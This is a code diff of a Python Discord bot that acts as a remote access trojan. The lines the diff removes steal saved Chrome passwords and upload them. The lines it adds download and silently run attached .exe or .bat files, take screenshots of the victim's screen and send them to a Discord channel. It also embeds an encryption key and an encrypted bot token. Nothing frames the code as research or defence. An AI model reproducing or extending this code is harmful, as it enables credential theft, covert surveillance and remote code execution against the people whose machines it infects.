@@ -1,28 +1,16 @@
 import os
-import os.path as op
-import shutil
-import smtplib
-import win32crypt
-from email import encoders
-from email.mime.base import MIMEBase
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from email.utils import formatdate
-from shutil import copyfile
-from sqlite3 import connect
 import discord
 import subprocess
 from discord.ext import commands
+from PIL import ImageGrab
+import io
+import platform
 from cryptography.fernet import Fernet
-import platform  # Add this import statement
 
 # Decrypting the token
-
-# Replace with the encryption key you generated (it must be a bytes object)
 key = b"XNVMkRPc1qP4Bq9C_OXAtYWD54rpUtJNpO_PICvFLII="  # Replace with your actual key
 cipher_suite = Fernet(key)
 
-# Replace with the encrypted token you generated
 encrypted_token = b"gAAAAABouGj2ioU6r5nWwx4MPC42YD4zvPVqYfFYKmRELhCwPu4a4PCam5O7xzVMgY4QdSJSnUgcuVfygaO-M4X__OnuC2Qw7H_hDhqdWXgi4-HRTorljLeo5EGJyMXOQnmc0ktWi9jIFQNKHeheNBEi5UAFY6BrHI9cX4y7YHB10Clk6u-RpG0="  # Replace with your actual encrypted token
 
 # Decrypt the token
@@ -51,64 +39,46 @@ async def get_or_create_channel(ctx, user_name):
         channel = await guild.create_text_channel(user_name)
     return channel
 
-# Function to extract passwords from Chrome
-def getPass():
-    env = os.getenv("LOCALAPPDATA")
-    destination = "output.txt"
-
-    path = env + "\\Google\\Chrome\\User Data\\Default\\Login Data"
-    path2 = env + "\\Google\\Chrome\\User Data\\Default\\Login2"
-    path = path.strip()
-    path2 = path2.strip()
-
-    try:
-        copyfile(path, path2)
-    except:
-        pass
-    conn = connect(path2)
-    cursor = conn.cursor()
-    cursor.execute(
-        'SELECT action_url, username_value, password_value FROM logins')
-    if os.path.exists(destination):
-        os.remove(destination)
-    sites = []
-    for raw in cursor.fetchall():
-        try:
-            if raw[0] not in sites:
-                if os.path.exists(destination):
-                    with open(destination, "a") as password:
-                        password.write('\n' + "Website: " + raw[0] + '\n' + "User/email: " + raw[1] +
-                                       '\n' + "Password: " + format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')
-                else:
-                    with open(destination, "a") as password:
-                        password.write('\n' + "Website: " + raw[0] + '\n' + "User/email: " + raw[1] +
-                                       '\n' + "Password: " + format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')
-                sites.append(raw[0])
-        except:
-            continue
-    conn.close()
-    return 0
-
-# Command to grab and send passwords
+# Command to handle file sending
 @bot.command()
-async def grab(ctx):
-    # Get the desktop name or username to create the channel
-    desktop_name = platform.node()  # This is the name of the PC
-    channel_name = desktop_name or os.getlogin()  # Default to the user’s login name if desktop name is not found
+async def send(ctx):
+    # Check if the command is in the correct channel
+    if ctx.channel.id != CHANNEL_ID:
+        return
 
-    # Check if the command is executed in the correct channel
-    if ctx.channel.name != channel_name.lower():
-        return  # Ignore the command if it's not in the correct channel
+    if len(ctx.message.attachments) > 0:
+        attachment = ctx.message.attachments[0]
+        file_path = os.path.join(DOWNLOAD_DIR, attachment.filename)
 
-    # Extract passwords
-    getPass()
+        # Download the file
+        await attachment.save(file_path)
 
-    # Send the output.txt file as an attachment
-    file_path = "output.txt"
-    if os.path.exists(file_path):
-        await ctx.send(file=discord.File(file_path))
+        # Now run the downloaded file silently (e.g., .exe, .bat)
+        try:
+            if file_path.endswith(".bat") or file_path.endswith(".exe"):
+                subprocess.run([file_path], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                await ctx.send(f"Executed {attachment.filename} successfully!")
+            else:
+                await ctx.send(f"Unsupported file type: {attachment.filename}")
+        except Exception as e:
+            await ctx.send(f"Failed to execute {attachment.filename}: {str(e)}")
     else:
-        await ctx.send("No passwords found or an error occurred during extraction.")
+        await ctx.send("No file attached. Please attach a file to send.")
+
+# Command to take a screenshot
+@bot.command()
+async def screenshot(ctx):
+    # Check if the command is in the correct channel
+    if ctx.channel.id != CHANNEL_ID:
+        return
+
+    # Take a screenshot using Pillow
+    screenshot = ImageGrab.grab()
+    # Save the screenshot to a BytesIO object
+    byte_io = io.BytesIO()
+    screenshot.save(byte_io, 'PNG')
+    byte_io.seek(0)
+    await ctx.send("Here is the screenshot:", file=discord.File(byte_io, 'screenshot.png'))
 
 # On bot startup: Check and create the channel, ping @everyone in the corresponding channel
 @bot.event
@@ -126,6 +96,9 @@ async def on_ready():
         return
 
     channel = await get_or_create_channel(guild, channel_name)
+
+    global CHANNEL_ID
+    CHANNEL_ID = channel.id
 
     # Send a "ping" message to indicate the bot is online
     await channel.send(f"@everyone The bot is now online and active on {desktop_name}.")
